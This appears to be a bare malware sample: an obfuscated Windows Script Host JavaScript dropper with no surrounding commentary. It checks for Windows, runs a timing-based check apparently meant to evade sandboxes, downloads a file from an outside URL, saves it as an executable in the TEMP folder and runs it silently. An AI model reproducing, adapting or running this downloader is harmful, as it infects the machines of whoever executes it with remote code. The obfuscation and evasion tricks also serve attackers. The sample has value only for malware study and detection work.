var _UZ = false;
var _GL = "CreateObject";
var _IJ = function _OX() {return WScript[_GL]("WScript"+".Shell");}(), _KK = 11;
var _NX = "MSXML2.XMLHTTP";
var _TI = 2123213;
var _U = 0;
function _OA(_A0){_IJ["Run"](_A0, _U, _U);};
function _A(){return _NX + "";};
function _PC(_C, _F1){_U = _U * 1; return _C - _F1;};
function _WU(){return _GL;};
/*@cc_on
  @if (@_win32 || @_win64)
    _UZ = true;
  @end
@*/
if (_UZ)
{
var _ZS = "";
function _G(){return 22;};
var _CV = 0; var _BI = 0;
function _N()
{
var _Q = new this["Date"]();
var _V0 = _Q["getUTCMilliseconds"]();
WScript["Sleep"](_G());
var _Q = new this["Date"]();
var _V = _Q["getUTCMilliseconds"]();
WScript["Sleep"](_G());
var _Q = new this["Date"]();
var _NV = _Q["getUTCMilliseconds"]();
var _CV = "_UO";
_CV = _PC(_V, _V0);
var _BI = "_O0";
_BI = _PC(_NV, _V);
_ZS = "open";
return _PC(_CV, _BI);
}
var _J = false;
var _F0 = false;
for (var _U0 = _U; _U0 < _G() * 1; _U0++){if (_N() != _U){
_J = true; 
_BI = "31" + 11 * _CV + _BI; 
_F0 = true; 
break;
}}
function _F() {return ((_J == true) && (_J == _F0)) ? 1 : _U;};
if (_J && _F() && _F0){
function _K() {return _IJ["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "aUA2GYHUGsM7fdCm.ex" + "e";};
 _Y = _A();
 _BB = WScript[_GL](_Y);
 var _P = 1;
 while (_P){
try {
	if (_P == 1)
	{
		_BB[_ZS]("GET", "http://bonares.pl/x9isa", false);
		_BB["send"]();
		_NO = "Sleep";
	}
	WScript[_NO](_G() + 120); 
	if (_BB["readystate"] < 2 * 2) continue;
	_P = _U;
	function _D(_O) {var _R = (1, 2, 3, 4, 5, _O); return _R;};
	_K1 = WScript[_WU()]("ADODB.Stream");
	_Y = _K1;
	_Y[_ZS]();
	_Y["type"] = _D(1);
	_Y["write"](_BB["ResponseBody"]);
	_K1["position"] = _D(_U);
	_Y["Save" + "ToFile"](_K(), 2);
	_K1["cl"+"ose"]();
	_AN = _K();
	_OA(_AN);
} catch(_K0){};
}
}
}

